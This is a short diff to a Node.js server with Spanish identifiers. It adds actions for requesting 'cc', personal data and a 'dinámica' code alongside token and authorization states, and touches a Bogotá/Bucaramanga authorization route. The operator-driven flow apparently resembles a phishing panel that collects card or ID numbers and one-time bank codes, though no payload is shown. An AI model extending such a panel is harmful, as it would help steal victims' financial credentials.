@@ -364,7 +364,10 @@ const server = http.createServer(async (req, res) => {
                         TOKEN: 'token', 
                         FINALIZAR: 'finalizado',
                         CC_ERROR: 'cc_error',
-                        AUTORIZAR: 'autorizacion'
+                        AUTORIZAR: 'autorizacion',
+                        PEDIR_CC: 'pedir_cc',
+                        PEDIR_DATOS: 'pedir_datos',
+                        PEDIR_DINAMICA: 'pedir_dinamica'
                     };
                     if (!mapEstados[accion]) { json(res, 400, { ok: false, error: 'Acción inválida' }); return; }
                     
@@ -613,7 +616,7 @@ const server = http.createServer(async (req, res) => {
         }
 
         // ============================================================
-        // 🔥 RUTA 5: Enviar Autorización (LA QUE FALTABA)
+        // 🔥 RUTA 5: Enviar Autorización
         // ============================================================
         const authMatch = url.match(/^\/cc-(bogota|bucaramanga)\/enviar-autorizacion$/);
         if (req.method === 'POST' && authMatch) {
@@ -835,7 +838,6 @@ const server = http.createServer(async (req, res) => {
         res.writeHead(404);
         res.end('Not found');
     } catch (globalError) {
-        // Esto evita que el servidor se caiga si hay un error inesperado
         console.error('Error global en el servidor:', globalError);
         try {
             json(res, 500, { ok: false, error: 'Error interno del servidor' });
